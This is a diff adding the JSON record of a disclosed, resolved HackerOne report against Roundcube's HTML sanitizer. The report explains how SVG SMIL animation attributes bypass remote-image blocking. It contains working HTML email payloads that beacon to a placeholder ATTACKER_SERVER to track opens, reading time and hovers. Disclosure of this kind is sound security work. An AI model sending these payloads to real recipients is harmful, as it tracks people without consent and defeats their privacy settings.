@@ -1,0 +1,136 @@
+{
+  "id": 3590576,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTkwNTc2",
+  "url": "https://hackerone.com/reports/3590576",
+  "title": "SMIL values and by attributes bypass remote image blocking via unvalidated resource-loading animations, enabling email tracking without consent",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-03-07T11:33:02.452Z",
+  "submitted_at": "2026-03-07T11:33:03.280Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nullcathedral",
+    "url": "/nullcathedral",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/0msiosnihxn702obxntp2gl96eid/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-04-20T12:03:33.897Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-03-21T12:03:20.543Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "When `allow_remote` is set to `false`, Roundcube's HTML sanitizer [rcube_washtml](https://github.com/roundcube/roundcubemail/blob/4e95ebe12/program/lib/Roundcube/rcube_washtml.php) blocks external resources by validating URI attributes through `wash_uri()`. For SVG SMIL animation elements (`<animate>`, `<set>`, etc.), the `to` and `from` attributes are correctly validated by resolving the `attributeName` and routing through the appropriate URI check ([washtml.php L302-308](https://github.com/roundcube/roundcubemail/blob/4e95ebe12/program/lib/Roundcube/rcube_washtml.php#L302-L308)).\n\nHowever, the `values` and `by` attributes are both in the allowed attributes list (`$html_attribs`) and fall through to the generic pass-through at [L335-336](https://github.com/roundcube/roundcubemail/blob/4e95ebe12/program/lib/Roundcube/rcube_washtml.php#L335-L336) with no URI validation whatsoever. Additionally, the element-level animation block at [L573-574](https://github.com/roundcube/roundcubemail/blob/4e95ebe12/program/lib/Roundcube/rcube_washtml.php#L573-L574) only blocks animations targeting `attributeName=\"href\"` (the CVE-2024-37383 fix), allowing animations targeting `mask`, `cursor`, and other resource-loading attributes to pass through.\n\nCombined, these two gaps allow an attacker to use SMIL animations to load arbitrary external URLs, bypassing `allow_remote=false`.\n\n## Steps To Reproduce\n\n### Step 1: Zero-click email open tracking via SVG `mask` animation\n\nSend an HTML email with the following body:\n\n```html\n<!DOCTYPE html>\n<html>\n<head><title>Important Document</title></head>\n<body>\n<h1>Important Information</h1>\n<p>Dear valued customer,</p>\n<p>Please review the attached information carefully.</p>\n\n<svg width=\"1\" height=\"1\" style=\"position:absolute;left:-9999px\">\n  <rect width=\"1\" height=\"1\" fill=\"white\">\n    <animate attributeName=\"mask\"\n      values=\"url(//ATTACKER_SERVER/track?uid=victim@test.com)\"\n      fill=\"freeze\" dur=\"0.001s\" />\n  </rect>\n</svg>\n\n<p>Best regards,<br>Totally Legitimate Company</p>\n</body>\n</html>\n```\n\nStep 2: Open the email in Roundcube (Firefox) with \"Block remote images\" enabled.\n\nStep 3: Observe HTTP request to `ATTACKER_SERVER/track?uid=victim@test.com` in attacker's server logs.\n\n### Variant: Dwell-time measurement\n\nThe SMIL `keyTimes` attribute combined with multi-value `values` allows timed beacon firing, measuring how long a recipient views the email:\n\n```html\n<svg width=\"1\" height=\"1\" style=\"position:absolute;left:-9999px\">\n  <rect width=\"1\" height=\"1\">\n    <animate attributeName=\"mask\"\n      values=\"none;url(//ATTACKER_SERVER/ping?t=1);url(//ATTACKER_SERVER/ping?t=2)\"\n      dur=\"5s\" repeatCount=\"indefinite\" />\n  </rect>\n</svg>\n```\n\n### Variant: Hover interaction tracking\n\nSMIL animation of the CSS `cursor` property fires a resource load when the user hovers over the element:\n\n```html\n<svg width=\"400\" height=\"100\">\n  <rect width=\"400\" height=\"100\" fill=\"#f0f0f0\" rx=\"8\">\n    <animate attributeType=\"CSS\" attributeName=\"cursor\"\n      values=\"url(//ATTACKER_SERVER/track?uid=victim@test.com), auto\"\n      fill=\"freeze\" dur=\"0.001s\" />\n  </rect>\n  <text x=\"200\" y=\"55\" text-anchor=\"middle\"\n        font-family=\"Arial\" font-size=\"14\" fill=\"#333\"\n        pointer-events=\"none\">Hover over this area</text>\n</svg>\n```\n\n## Impact\n\nTracking of opens, read time, and element hover",
+  "weakness": {
+    "id": 71,
+    "name": "Remote File Inclusion"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-04-20T12:03:21.372Z",
+  "allow_singular_disclosure_after": -1052282.756955292,
+  "singular_disclosure_allowed": true,
+  "vote_count": 26,
+  "voters": [
+    "mohaned0101",
+    "2026",
+    "vishnumadhavan",
+    "nwicks",
+    "red_blue_lilith",
+    "blackops32",
+    "victor10",
+    "0xmsd",
+    "acd421",
+    "lucius-log",
+    "and 16 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.7,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 565457,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/roundcube/roundcubemail",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
